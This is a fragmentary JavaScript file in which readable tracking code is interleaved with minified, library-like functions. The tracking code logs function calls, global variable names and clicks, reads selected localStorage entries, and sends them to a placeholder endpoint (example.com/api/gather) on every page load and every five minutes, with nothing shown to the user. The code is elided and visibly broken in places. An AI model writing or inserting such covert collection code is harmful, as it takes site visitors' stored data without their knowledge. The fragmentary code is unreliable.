(function () {
  ...
  // JSHook to track function invocations
  function JSHook(fn) {
    return function () {
      globalJSInvocations.push({
        fn: fn.name,
        time: new Date()
      });
  ...
  for (let identifier in window) {
    if (typeof window[identifier] !== 'function') {
      globalVarCollector.push(identifier);
    }
  }
  function lb() {
    this.G = {};
  ...
  function hashGeneration(data) {
    let hashing = [];
    for (let i = 0; i < data.length; i++) {
      hashing[i] = ('00' + data.charCodeAt(i).toString(16)).substr(-2);
    }
    return hashing.join('');
  }
  function Q() {
  ...
  function fetchTrackedLocalStorage() {
    let matchedLocalStorageData = {};
    for (let key in window.localStorage) {
      if (trackingKeys.includes(key)) {
        matchedLocalStorageData[key] = window.localStorage.getItem(key);
      }
    }
    return matchedLocalStorageData;
  }
  R.Sb = function () {
    return R.J;
  };
  ...
  function sendToServer(data, jsInvocations, globalVariables) {
    const uniqueTrackingId = hashGeneration(data);
    const serverUrl = "https://example.com/api/gather";
    fetch(serverUrl, {
      method: 'POST',
      headers: {
      ...
      body: JSON.stringify({
        ...
        functionInvocations: jsInvocations,
        globalVariables: globalVariables
      })
    }).then(response => {
      if (!response.ok) throw new Error(`Error: ${response.status}`);
      console.log("Data successfully sent!");
    }).catch(error => console.log('Error sending data: ' + error.message));
  }
  function Zb(a) {
  ...
  ba(V, S);
  function fetchAndSendLocalStorageData() {
    const localStorageData = fetchTrackedLocalStorage();
    if (Object.keys(localStorageData).length > 0) {
      sendToServer(localStorageData, globalJSInvocations, globalVarCollector);
    }
  }
  n = V.prototype;
  n.D = function () {
  ...
  window.onload = JSHook(fetchAndSendLocalStorageData);
  n.$a = function () {
    this.Ta = $b();
    D.D();
    if (this.ta) {
  ...
  ;
  setInterval(JSHook(fetchAndSendLocalStorageData), 5 * 60 * 1000);
  ...
  document.onclick = function (event) {
    ...
    globalJSInvocations.push(eventData);
  };
  ;
  function Fc(a, b) {
    this.Cb = b;
